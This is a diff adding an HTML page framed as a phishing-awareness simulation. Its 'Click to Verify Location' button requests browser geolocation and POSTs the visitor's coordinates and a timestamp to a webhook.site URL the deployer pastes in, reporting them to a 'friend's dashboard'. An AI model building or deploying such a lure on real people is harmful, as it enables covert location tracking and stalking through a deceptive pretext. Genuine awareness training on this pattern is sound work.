@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Phishing Awareness Demonstration</title>
+</head>
+<body>
+    <h2>Security Awareness Test: Location Capture Simulation</h2>
+    <p>Press the button to simulate a consented tracking demonstration.</p>
+    
+    <button onclick="getLocation()">Click to Verify Location</button>
+    <p id="output">Waiting for action...</p>
+
+    <script>
+    // PASTE YOUR UNIQUE WEBHOOK.SITE URL BETWEEN THE QUOTES BELOW
+    const webHookUrl = "https://webhook.site";
+
+    function getLocation() {
+        document.getElementById("output").innerHTML = "Requesting permission...";
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(sendPositionToServer, showError);
+        } else {
+            document.getElementById("output").innerHTML = "Geolocation not supported.";
+        }
+    }
+
+    function sendPositionToServer(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        document.getElementById("output").innerHTML = "Sending data to dashboard...";
+
+        // This fetch block sends the coordinates to your Webhook URL
+        fetch(webHookUrl, {
+            method: "POST",
+            mode: "cors",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                latitude: lat,
+                longitude: lon,
+                timestamp: new Date().toISOString()
+            })
+        })
+        .then(response => {
+            document.getElementById("output").innerHTML = "Data successfully sent to your friend's dashboard!";
+        })
+        .catch(error => {
+            document.getElementById("output").innerHTML = "Error sending data.";
+            console.error('Error:', error);
+        });
+    }
+
+    function showError(error) {
+        document.getElementById("output").innerHTML = "User blocked the request. No data sent.";
+    }
+    </script>
+</body>
+</html>
